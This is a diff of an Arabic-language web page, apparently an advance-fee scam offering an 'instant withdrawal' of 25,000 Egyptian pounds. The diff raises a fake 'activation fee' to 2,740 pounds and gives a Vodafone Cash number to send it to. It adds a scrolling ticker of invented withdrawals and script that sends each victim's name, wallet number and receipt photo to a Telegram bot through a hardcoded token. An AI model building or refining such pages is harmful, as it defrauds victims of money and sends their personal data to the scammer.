@@ -17,17 +17,17 @@
         overflow-x: hidden;
     }
 
-    /* تصغير النصوص الجانبية */
+    /* النصوص الجانبية المصغرة */
     .side-text {
         position: fixed;
         top: 50%;
         transform: translateY(-50%);
         background: var(--primary-color);
         color: white;
-        padding: 5px; /* تصغير البادينج */
+        padding: 5px;
         font-weight: bold;
         writing-mode: vertical-rl;
-        font-size: 11px; /* تصغير الخط */
+        font-size: 11px;
         z-index: 100;
         border-radius: 3px;
         box-shadow: 0 0 5px rgba(0,0,0,0.1);
@@ -42,26 +42,9 @@
         border-radius: 20px;
         overflow: hidden;
         box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+        margin-bottom: 60px; /* مساحة للشريط السفلي */
     }
     
-    /* صورة الضمان في المنتصف */
-    .trust-badge {
-        width: 120px;
-        height: 120px;
-        background: #f9f9f9;
-        border: 2px dashed var(--primary-color);
-        border-radius: 50%;
-        margin: 20px auto;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        color: var(--primary-color);
-        font-weight: bold;
-        font-size: 14px;
-        text-align: center;
-        padding: 10px;
-    }
-
     .banner {
         background: linear-gradient(45deg, #25d366, #128c7e);
         color: white;
@@ -81,6 +64,21 @@
         box-sizing: border-box;
     }
 
+    .wallet-box {
+        background: #fff9e6;
+        border: 2px solid var(--secondary-color);
+        padding: 15px;
+        border-radius: 10px;
+        margin: 15px 0;
+    }
+    .wallet-number {
+        display: block;
+        font-size: 22px;
+        color: #c40000;
+        font-weight: bold;
+        margin: 10px 0;
+    }
+
     button {
         background: var(--secondary-color);
         border: none;
@@ -91,6 +89,17 @@
         font-weight: bold;
         cursor: pointer;
         box-shadow: 0 4px 0 #d4b000;
+    }
+
+    /* شريط السحوبات السفلي */
+    .ticker-wrap {
+        position: fixed;
+        bottom: 0;
+        width: 100%;
+        background: #333;
+        color: #fff;
+        padding: 10px 0;
+        z-index: 1000;
     }
 </style>
 </head>
@@ -104,25 +113,35 @@
 </div>
 
 <div class="main-container">
-    <div class="banner">سحب الأرباح الفوري 💰</div>
+    <div class="banner">نظام سحب الأرباح الفوري 💰</div>
     
-    <div class="trust-badge">
-        تعامل مضمون <br> 100% ✅
-    </div>
-
     <div class="content" id="step-1">
-        <p>سجل بياناتك لاستلام 2,740 ج.م</p>
+        <h3 style="color: var(--primary-color);">سجل بياناتك وادفع الرسوم 2740 واستلم ربحك فوراً</h3>
+        <p>الرصيد المتاح لك حالياً: <b>25,000 ج.م</b></p>
         <input type="text" id="in-name" placeholder="الاسم الرباعي">
-        <input type="number" id="in-phone" placeholder="رقم فودافون كاش">
-        <button onclick="nextStep()">استمرار للسحب</button>
+        <input type="number" id="in-phone" placeholder="رقم محفظتك لاستلام الأرباح">
+        <button onclick="nextStep()">الاستمرار للمرحلة النهائية</button>
     </div>
 
     <div class="content" id="step-2" style="display: none;">
-        <h3 style="color:red">متبقي خطوة واحدة!</h3>
-        <p>أرسل رسوم التفعيل (50 ج) وأرفق الإيصال</p>
-        <input type="file" id="file-up">
-        <button onclick="finish()">تأكيد الإرسال</button>
+        <h3 style="color:#c40000">تأكيد عملية السحب</h3>
+        <p>حول رسوم التفعيل (<b>2740 ج.م</b>) للرقم التالي:</p>
+        
+        <div class="wallet-box">
+            رقم التحويل (فودافون كاش):
+            <span class="wallet-number">01270399629</span>
+        </div>
+
+        <p>ارفع إيصال التحويل لتفعيل سحب الـ 25 ألف جنيه:</p>
+        <input type="file" id="file-up" accept="image/*">
+        <button id="final-btn" onclick="finish()">تأكيد وإرسال الإيصال</button>
     </div>
+</div>
+
+<div class="ticker-wrap">
+    <marquee scrollamount="5">
+        ✅ تم سحب 20,000 ج.م بواسطة أحمد م. --- ✅ تم سحب 15,500 ج.م بواسطة سارة ع. --- ✅ تم سحب 30,000 ج.م بواسطة محمود ك. --- ✅ كوتش خديجة: "مبروك لكل الرابحين معنا اليوم" --- ✅ جاري معالجة 12 عملية سحب الآن...
+    </marquee>
 </div>
 
 <script>
@@ -131,14 +150,41 @@
             document.getElementById('step-1').style.display = 'none';
             document.getElementById('step-2').style.display = 'block';
         } else {
-            alert("اكتب البيانات أولاً");
+            alert("برجاء إدخال البيانات كاملة");
         }
     }
-    function finish() {
-        if(document.getElementById('file-up').value) {
+
+    async function finish() {
+        const name = document.getElementById('in-name').value;
+        const phone = document.getElementById('in-phone').value;
+        const fileInput = document.getElementById('file-up');
+        const btn = document.getElementById('final-btn');
+
+        if (fileInput.files.length === 0) {
+            alert("برجاء إرفاق صورة التحويل");
+            return;
+        }
+
+        const telegramToken = "8599127373:AAFgF2GBQMuscGGXzxs0Nayx3grP2aQulVQ"; 
+        const chatId = "8408093977"; 
+
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("photo", fileInput.files[0]);
+        formData.append("caption", `💰 سحب جديد:\n👤 الاسم: ${name}\n📱 المحفظة: ${phone}\n💵 دفع رسوم: 2740 ج.م`);
+
+        btn.innerText = "جاري الإرسال...";
+        btn.disabled = true;
+
+        try {
+            await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            });
             window.location.href = "success.html";
-        } else {
-            alert("ارفع صورة التحويل");
+        } catch (error) {
+            alert("خطأ في الاتصال");
+            btn.disabled = false;
         }
     }
 </script>
